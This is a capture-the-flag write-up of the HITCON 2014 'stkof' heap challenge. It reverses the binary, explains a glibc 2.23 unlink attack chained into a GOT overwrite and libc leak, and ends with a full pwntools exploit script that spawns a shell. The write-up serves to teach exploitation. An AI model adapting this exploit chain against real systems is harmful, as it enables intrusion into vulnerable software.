# Hitcon 2014 stkof

Let's take a look at the binary, and the libc:

```
$    file stkof
stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped
$    pwn checksec stkof
[*] '/home/guyinatuxedo/Desktop/hitcon14/stkof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./stkof
1
58
1
OK
2
9
FAIL
$ ./libc-2.23.so
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11) stable release version 2.23, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.4.0 20160609.
Available extensions:
  crypt add-on version 2.1 by Michael Glad and others
  GNU Libidn by Simon Josefsson
  Native POSIX Threads Library by Ulrich Drepper et al
  BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

So we can see that we are dealing with a `64` bit binary, with a Stack Canary and Non-Executable stack. When we run the binary it scans in input and responds with either `OK` or `FAIL`. In addition to that we are dealing with the libc version `libc-2.23.so ` (full disclosure I'm not sure if this is the original libc for the challenge, but it works with the unlink attack).

## Reversing

When we take a look at the binary in Ghidra, we find a function at `0x00400c58` that appears to be the menu function:

```

undefined8 main(void)

{
  int menuChoice;
  char *bytesRead;
  long in_FS_OFFSET;
  int result;
  char input [104];
  long stackCanary;
 
  stackCanary = *(long *)(in_FS_OFFSET + 0x28);
  alarm(0x78);
  do {
    bytesRead = fgets(input,10,stdin);
    if (bytesRead == (char *)0x0) {
      if (stackCanary == *(long *)(in_FS_OFFSET + 0x28)) {
        return 0;
      }
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    menuChoice = atoi(input);
    if (menuChoice == 2) {
      result = scanData();
    }
    else {
      if (menuChoice < 3) {
        if (menuChoice == 1) {
          result = allocateChunk();
        }
        else {
LAB_00400ce3:
          result = -1;
        }
      }
      else {
        if (menuChoice == 3) {
          result = freeFunction();
        }
        else {
          if (menuChoice != 4) goto LAB_00400ce3;
          result = printData();
        }
      }
    }
    if (result == 0) {
      puts("OK");
    }
    else {
      puts("FAIL");
    }
    fflush(stdout);
  } while( true );
}
```

So we can see, we have four different menu options. `1` for allocating chunks, `2` for scanning data, `3` for free a chunk, and `4` for printing data. Also there is a system where the functions will report back if they were successful, and that is what triggers either the `OK` or `FAIL`. Let's take a look at `allocateChunk`:

```
undefined8 allocateChunk(void)

{
  long lVar1;
  size_t __size;
  void *ptr;
  undefined8 uVar2;
  long in_FS_OFFSET;
  char sizeInp [104];
 
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  fgets(sizeInp,0x10,stdin);
  __size = atoll(sizeInp);
  ptr = malloc(__size);
  if (ptr == (void *)0x0) {
    uVar2 = 0xffffffff;
  }
  else {
    ptrCount = ptrCount + 1;
    *(void **)(&ptrArray + (long)(int)ptrCount * 8) = ptr;
    printf("%d\n",(ulong)ptrCount);
    uVar2 = 0;
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar2;
}
```

So we can see here, it prompts us for a size then mallocs that many bytes. There is no check on the size we pass it (only a check to ensure that malloc didn't return a null pointer). After that it will increment the bss integer `ptrCount` at `0x602100`, and store the pointer in `ptrArray` at `0x602140` (also it is one indexed so the pointers start at `0x602148`). Next up we have the `scanData` function:

```
undefined8 scanData(void)

{
  long lVar1;
  int bytesReadCpy;
  ulong index;
  undefined8 result;
  size_t bytesRead;
  long in_FS_OFFSET;
  size_t size;
  void *ptr;
  char input [104];
  long canary;
 
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  fgets(input,0x10,stdin);
  index = atol(input);
  if ((uint)index < 0x100001) {
    if (*(long *)(&ptrArray + (index & 0xffffffff) * 8) == 0) {
      result = 0xffffffff;
    }
    else {
      fgets(input,0x10,stdin);
      size = atoll(input);
      ptr = *(void **)(&ptrArray + (index & 0xffffffff) * 8);
      while( true ) {
        bytesRead = fread(ptr,1,size,stdin);
        bytesReadCpy = (int)bytesRead;
        if (bytesReadCpy < 1) break;
        ptr = (void *)((long)ptr + (long)bytesReadCpy);
        size = size - (long)bytesReadCpy;
      }
      if (size == 0) {
        result = 0;
      }
      else {
        result = 0xffffffff;
      }
    }
  }
  else {
    result = 0xffffffff;
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return result;
}
```

Here we can see that it prompts us an index to `ptrArray` for where to scan in data. Then it prompts us for the amount of bytes to scan in. Notice that it doesn't check the size we pass it, so we have a heap overflow bug here. Next up we have `freeFunction`:

```

undefined8 freeFunction(void)

{
  long lVar1;
  ulong index;
  undefined8 result;
  long in_FS_OFFSET;
  char indexInput [104];
  long stackCanary;
 
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  fgets(indexInput,0x10,stdin);
  index = atol(indexInput);
  if ((uint)index < 0x100001) {
    if (*(long *)(&ptrArray + (index & 0xffffffff) * 8) == 0) {
      result = 0xffffffff;
    }
    else {
      free(*(void **)(&ptrArray + (index & 0xffffffff) * 8));
      *(undefined8 *)(&ptrArray + (index & 0xffffffff) * 8) = 0;
      result = 0;
    }
  }
  else {
    result = 0xffffffff;
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return result;
}
```

Here we can see, it prompts us for an index to free. If it passes the check, it will free the pointer, and clear it out (so no use after free). Next up we have `printData`:

```
undefined8 printData(void)

{
  ulong uVar1;
  undefined8 uVar2;
  size_t sVar3;
  long in_FS_OFFSET;
  char local_78 [104];
  long local_10;
 
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  fgets(local_78,0x10,stdin);
  uVar1 = atol(local_78);
  if ((uint)uVar1 < 0x100001) {
    if (*(long *)(&ptrArray + (uVar1 & 0xffffffff) * 8) == 0) {
      uVar2 = 0xffffffff;
    }
    else {
      sVar3 = strlen(*(char **)(&ptrArray + (uVar1 & 0xffffffff) * 8));
      if (sVar3 < 4) {
        puts("//TODO");
      }
      else {
        puts("...");
      }
      uVar2 = 0;
    }
  }
  else {
    uVar2 = 0xffffffff;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar2;
}
```

This function really doesn't do much. We specify an index to a chunk, and it checks if it is a non-null pointer. If so it checks the length with `strlen`. If it is less than `4`, it will print `//TODO` and if not it prints `...`. This really doesn't tell us much, however notice how this is the only place that `strlen` is called. That will come in later.

## Exploitation

Our exploitation process will contain two parts. The first will be doing an Unlink Attack, and the second will be a GOT overwrite / infoleak.

### Unlink

So for our exploitation process, we will be doing an unlink attack (which is viable on older libc versions, think pre-tcache). Unlinking for the heap is the process of removing a chunk from a bin list (in this case for heap consolidation for performance improvement reasons). What this attack will do is give us a write. However there are a lot of restrictions on what we can write and where we can write. Essentially when an unlink happens, it will write pointers to a chunk to fill in the gap of the chunk that was taken out. This is the write that we get. Let's take a look at the code in `malloc.c` to get a bit of an idea:

```
/* Take a chunk off a bin list.  */
static void
unlink_chunk (mstate av, mchunkptr p)
{
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr ("corrupted size vs. prev_size");
  mchunkptr fd = p->fd;
  mchunkptr bk = p->bk;
  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");
  fd->bk = bk;
  bk->fd = fd;
if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
```

So we can see here, what it does is it takes a chunk, and performs some checks on it. If the chunk passess all of the checks, it will write the pointers with `fd->bk = bk`, `bk->fd = fd`. There are essentially three checks that we need to worry about which we will set up a fake chunk for it. In order for this to work, we need a pointer to the malloc chunk which we will be making our fake chunk in stored somewhere we know. All of our heap chunks are stored in the bss starting at `0x602148` (remember no PIE) so we have that requirement met. Next up we will need to setup the fake chunk, which will contain `fwd` and `bk` pointers which on paper should point to the previous and next chunks in the list (since in the unlink the middle chunk gets removed, pointers to the `fwd` and `bk` chunks are written to each other to fill the gap in the list).

So here is a bit of a representation of what's happening. Starting off here are our three chunks that will be a part of the unlink. They are linked via a doubly linked list with `fd` (forward) and `bk` (back) pointers. The only chunk we are actually going to write any data for will be the middle chunk. For this we will allocate two chunks (actual chunks allocated with malloc). These two chunks will need to be stored adjacent in memory (so we can use one to overflow the other). In the first one we will store the fake chunk, and also use it to overflow into the metadata of the second chunk. Then by freeing the second chunk it will trigger the unlink. The second chunk will not store any part of these three chunks.:

```
+----------------+    +----------------+    +----------------+
| BK             |    | P (fake chunk) |    | FD             |
+----------------+    +----------------+    +----------------+
| BK->fd          |    | P->fd           |    | FD->fd         |
+----------------+    +----------------+    +----------------+
| BK->bk         |    | P->bk          |  | FD->bk         |
+----------------+    +----------------+    +----------------+
```

So in order to pass the unlink check for `if (__builtin_expect (fd->bk != p || bk->fd != p, 0))`, the back pointer of the next chunk and the forward pointer of the previous chunk must be equal to the chunk address of our fake chunk. This is why we need a pointer to our heap chunk to be stored in an area of memory that we know and can read from. Since we have that in the PIE, this is fairly easy to set up. We just need to take the address that the pointer to our fake chunk is stored at, and subtract `0x18` from it to setup the `P->FD` pointer. The first `0x10` bytes of the `0x18` is because there are two QWORDS taken up for the heap metadata (like with a lot of heap chunks). The last `0x8` bytes is because with the `FD` chunk, we are worried about the `FD->bk` pointer not the `FD->fd` and the `FD->fd` takes up the first eight bytes of the chunk (so we need to shift it back by eight bytes to get the pointer in the right spot). Coincidentally we need to subtract `0x10` bytes from the pointer to our fake heap chunk for our `P->bk`, since with that chunk we are worried about the `fwd` pointer which is before the back pointer. The values for `FD-fd ` and `BK->bk ` don't matter too much in this case:

```
+----------------+    +----------------+    +----------------+
| BK             |    | P (fake chunk) |    | FD             |
+----------------+    +----------------+    +----------------+
| BK-fd -> P     |    | P-fd  -> FD    |    | FD-fd  -> null |
+----------------+    +----------------+    +----------------+
| BK->bk -> null |    | P->bk -> BK    |  | FD->bk -> P    |
+----------------+    +----------------+    +----------------+
```

There are two more checks we need to worry about. The first is the size check of our fake chunk, which we will cover in a bit when we talk about how exactly we are going to overflow the heap metadata. The third check consists of the `p->fd_nextsize != NULL`. If we can set `p->fd_nextsize` equal to null, that means we will be able to skip most other checks which will save us a lot of time and hassle. Looking at the source code in `malloc.c` (https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#_int_free) we can see it is stored right after the `bk` pointer:

```
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

So in order to hit that check that way we want, we just need to set the next QWORD after `bk` to be `0x0`.

After that, we will free the second chunk (second chunk that we allocated) which will trigger the unlink, and write a pointer to `BK-fd` and `FD->bk`. In this case it will be a pointer to the fake `FD` chunk, since they will both be writing it to the same location in memory, however that pointer gets written last.

```
+----------------+    +----------------+
| BK             |    | FD             |
+----------------+    +----------------+
| BK-fd -> FD    |    | FD-fd  -> null |
+----------------+    +----------------+
| BK->bk -> null |    | FD->bk -> BK   |
+----------------+    +----------------+
```

Let's talk about how we will be overflowing the heap metadata and constructing the fake chunk. When I was just trying different things with the code, I noticed that when I was allocating `0xa0` byte chunks, the `4th` and `5th` chunks would be adjacent, so they would be good for the overflow:

```
gef➤  x/30g 0x14fc630
0x14fc630:  0x0 0xb1
0x14fc640:  0x0 0x0
0x14fc650:  0x0 0x0
0x14fc660:  0x0 0x0
0x14fc670:  0x0 0x0
0x14fc680:  0x0 0x0
0x14fc690:  0x0 0x0
0x14fc6a0:  0x0 0x0
0x14fc6b0:  0x0 0x0
0x14fc6c0:  0x0 0x0
0x14fc6d0:  0x0 0x0
0x14fc6e0:  0x0 0xb1
0x14fc6f0:  0x0 0x0
0x14fc700:  0x0 0x0
0x14fc710:  0x0 0x0
```

Here we can see two chunks of size `0xb1` (`0xa0` chunks with `0x10` bytes worth of metadata and `0x1` previous chunk in use bit set). We will store our fake chunk at `0x14fc640` and will contain the following values:

```
0x14fc640:  Previous Size   0x0
0x14fc648:  Size            0xa0
0x14fc650:  fd pointer      (0x602160 - (8*3))
0x14fc658:  bk pointer      (0x602160 - (8*2))
0x14fc660:  fd next size    0x0
```

In addition to that we will overflow the heap metadata of the next chunk (`0x14fc6f0`) with the following values:

```
0x14fc6d0:  Previous Size   0xa0
0x14fc6d8:  Size            0xb0
```

So the reason why we set the Size to `0xb0` is to clear out the previous in use bit, so malloc will think that the previous chunk has been freed (requirement for unlink). We placed a fake previous size value of `0xa0` because `0x14fc6e0 - 0xa0 = 0x14fc640` which is the start of our fake chunk. That way the previous size will point right to the start of our fake chunk (another requirement for the unlink). The reason why the `Size` for our fake chunk is set to `0xa0` is because of the `(chunksize (p) != prev_size (next_chunk (p)))` from malloc.c where it checks if the previous size of the chunk that is getting freed is the same as the chunk size of the chunk getting unlinked. I covered earlier why the values for `fd`, `bk` and `fd next size` were the values they are. After we create the fake chunk and execute the overflow, this is what the memory looks like:

```
gef➤  x/30g 0x14fc630
0x14fc630:  0x0 0xb1
0x14fc640:  0x0 0xa0
0x14fc650:  0x602148  0x602150
0x14fc660:  0x0 0x0
0x14fc670:  0x0 0x0
0x14fc680:  0x0 0x0
0x14fc690:  0x0 0x0
0x14fc6a0:  0x0 0x0
0x14fc6b0:  0x0 0x0
0x14fc6c0:  0x0 0x0
0x14fc6d0:  0x0 0x0
0x14fc6e0:  0xa0  0xb0
0x14fc6f0:  0x0 0x0
0x14fc700:  0x0 0x0
0x14fc710:  0x0 0x0
gef➤  x/4g 0x602150
0x602150: 0x14fc4e0 0x14fc590
0x602160: 0x14fc640 0x14fc6f0
gef➤  x/4g 0x602148
0x602148: 0x14fc020 0x14fc4e0
0x602158: 0x14fc590 0x14fc640
gef➤  x/10g 0x602140
0x602140: 0x0 0x14fc020
0x602150: 0x14fc4e0 0x14fc590
0x602160: 0x14fc640 0x14fc6f0
0x602170: 0x14fc7a0 0x0
0x602180: 0x0 0x0
```

So we can see our fake chunk and heap metadata overflow just like we planned. This should write the pointer `0x602148` to `0x602160` since `0x602148` is the `fd` pointer and `bk->fd = fd` happens in malloc.c. After the unlink, we can see that the write worked:

```
gef➤  x/10g 0x602140
0x602140: 0x0 0x14fc020
0x602150: 0x14fc4e0 0x14fc590
0x602160: 0x602148  0x14fc6f0
0x602170: 0x14fc7a0 0x0
0x602180: 0x0 0x0
gef➤  heap bins
[+] No Tcache in this version of libc
───────────────────────────────────────────────────────────────────────────────── Fastbins for arena 0x7f030751bb20 ─────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
───────────────────────────────────────────────────────────────────────────── Unsorted Bin for arena '*0x7f030751bb20' ─────────────────────────────────────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x14fc640, bk=0x14fc640
 →   Chunk(addr=0x14fc650, size=0x150, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
────────────────────────────────────────────────────────────────────────────── Small Bins for arena '*0x7f030751bb20' ──────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────────────────────────────────────────────────────── Large Bins for arena '*0x7f030751bb20' ──────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

So we can see that the unlink attack worked and we were able to write the pointer `0x602148` to `0x602160`. So we essentially wrote a pointer to the array at offset `+0x8` to itself. This is extremely helpful since that pointer is in a spot that we can write to it, and we can essentially overwrite pointers in the array, then write to those new pointers (we will use that for the GOT overwrite). We can see that the fake chunk we unlinked ended up in the unsorted bin. It's important that we allocate a chunk big enough that it doesn't end up in the fast bin, because that would cause this attack not to work.

### GOT Overwrite / Infoleak

So now that we have a pointer to the array of pointers that we can write to, the rest is going to be pretty simple and stuff we've already covered. We will write the got address of `strlen` (`strlen` is really convenient since it is only called in one spot that fits perfectly for this) to `0x602148` and the got address of `malloc` to `0x602150` (we will be overwriting both the values stored at both of these addresses). We will overwrite the got address of `strlen` with plt address of `puts` (since it is imported). That way when we call `printData` it will actually print the data of the chunk. Then we will call `printData` with and index of `2` (maps to `0x602150`) so it will leak the libc address of malloc to us. After that, we can just overwrite the got entry of malloc with a oneshot gadget (which we know thanks to the libc infoleak), and then just call malloc to get a shell. Here is a walkthrough on how the memory is corrupted:

First we start off with the memory post unlink attack:

```
gef➤  x/10g 0x602140
0x602140: 0x0 0x24fc020
0x602150: 0x24fc4e0 0x24fc590
0x602160: 0x602148  0x0
0x602170: 0x24fc7a0 0x0
0x602180: 0x0 0x0
```

We will use the `0x602148` to write the got entry addresses for `strlen` and `malloc`:

```
gef➤  x/10g 0x602140
0x602140: 0x0 0x602030
0x602150: 0x602070  0x24fc590
0x602160: 0x602148  0x0
0x602170: 0x24fc7a0 0x0
0x602180: 0x0 0x0
gef➤  x/g 0x602030
0x602030 <strlen@got.plt>:  0x400786
gef➤  x/g 0x602070
0x602070 <malloc@got.plt>:  0x7f42c19d9130
```

Next we will write the plt address of `puts` to the got entry for `strlen` and get the infoleak:

```
gef➤  x/10g 0x602140
0x602140: 0x0 0x602030
0x602150: 0x602070  0x24fc590
0x602160: 0x602148  0x0
0x602170: 0x24fc7a0 0x0
0x602180: 0x0 0x0
gef➤  x/g 0x602030
0x602030 <strlen@got.plt>:  0x400760
gef➤  x/i 0x400760
   0x400760 <puts@plt>: jmp    QWORD PTR [rip+0x2018ba]        # 0x602020 <puts@got.plt>
```

Finally we will just overwrite the got entry for `malloc` with a oneshot gadget, and then just call malloc to get a shell:

```
gef➤  x/10g 0x602140
0x602140: 0x0000000000000000  0x0000000000602030
0x602150: 0x0000000000602070  0x00000000024fc590
0x602160: 0x0000000000602148  0x0000000000000000
0x602170: 0x00000000024fc7a0  0x0000000000000000
0x602180: 0x0000000000000000  0x0000000000000000
gef➤  x/g 0x0000000000602070
0x602070 <malloc@got.plt>:  0x00007f42c1a452a4
gef➤  x/i 0x00007f42c1a452a4
```

Also remember to get our oneshot gadget:
```
$ one_gadget libc-2.23.so 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

## Exploit

Putting it all together we get the following exploit (this exploit was ran on `Ubuntu 16.04`):

```
from pwn import *

target = process("./stkof", env={"LD_PRELOAD":"./libc-2.23.so"})
elf = ELF("stkof")
libc = ELF("libc-2.23.so")

#gdb.attach(target, gdbscript='b *0x400b7a')

# I/O Functions
def add(size):
  target.sendline("1")
  target.sendline(str(size))
  print target.recvuntil("OK\n")

def scan(index, size, data):
  target.sendline("2")
  target.sendline(str(index))
  target.sendline(str(size))
  target.send(data)
  print target.recvuntil("OK\n")

def remove(index):
  target.sendline("3")
  target.sendline(str(index))
  print target.recvuntil("OK\n")

def view(index):
  target.sendline("4")
  target.sendline(str(index))
  #print "pillar"
  leak = target.recvline()
  leak = leak.replace("\x0a", "")
  leak = u64(leak + "\x00"*(8-len(leak)))
  print hex(leak)
  #print "men"
  print target.recvuntil("OK\n")
  return leak

# The array of ptrs starts at 0x602140
# 0x602160 contains the specific heap chunk ptr to the chunk which will hold our fake chunk in it
ptr = 0x602160

# Allocate several different chunks so we can get adjacent chunks
add(0xa0)
add(0xa0)
add(0xa0)
add(0xa0)# The chunk which will store our fake chunk
add(0xa0)
add(0xa0)

# Construct the fake chunk

fakeChunk = ""
fakeChunk += p64(0x0)   # Previous Size
fakeChunk += p64(0xa0)    # Size
fakeChunk += p64(ptr - 0x8*3) # FD ptr
fakeChunk += p64(ptr - 0x8*2) # BK ptr
fakeChunk += p64(0x0)*((0xa0 - 0x20)/8) # FD Next Size / filler to the next chunks heap metadata

# These 16 bytes will overflow into the next chunks heap metadata

fakeChunk += p64(0xa0)  # Previous Size
fakeChunk += p64(0xb0)  # Size

# Send the data for the fake chunk and the heap metadata overflow
scan(4, 0xb0, fakeChunk)

# Trigger the unlink attack by freeing the chunk with the overflowed heap metadata
remove(5)

# Write the got addresses of strlen and malloc to 0x602148 (array of ptrs of heap address)
scan(4, 0x10, p64(elf.got["strlen"]) + p64(elf.got["malloc"]))

# Overwrite got entry for strlen with plt address of puts
scan(1, 0x8, p64(elf.symbols["puts"]))

# Leak the libc address of malloc, calculate libc base and oneshot gadget address
mallocLibc = view(2)
libcBase = mallocLibc - libc.symbols["malloc"]
oneShot = libcBase + 0xf02a4

print "libc base: " + hex(libcBase)
print "oneshot gadget: " + hex(oneShot)

# Overwrite got entry for malloc with oneshot gadget
scan(2, 0x8, p64(oneShot))

# Call malloc
target.send("1\n1\n")

# Enjoy your shell!
target.interactive()
```

When we run it:

```
$ python exploit.py
[+] Starting local process './stkof': pid 28678
[*] '/home/guyinatuxedo/Desktop/hitcon14/stkof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/guyinatuxedo/Desktop/hitcon14/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
1
OK

2
OK

3
OK

4
OK

5
OK

6
OK

OK

OK

OK

OK

0x7f6a67af4130
...
OK

libc base: 0x7f6a67a70000
oneshot gadget: 0x7f6a67b602a4
OK

[*] Switching to interactive mode
$ w
 23:32:52 up 14:32,  1 user,  load average: 2.04, 1.68, 1.57
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               26Jun19 12days  1:43m  0.34s /sbin/upstart --user
$ ls
exploit.py  libc-2.23.so  stkof
```

Just like that we popped a shell!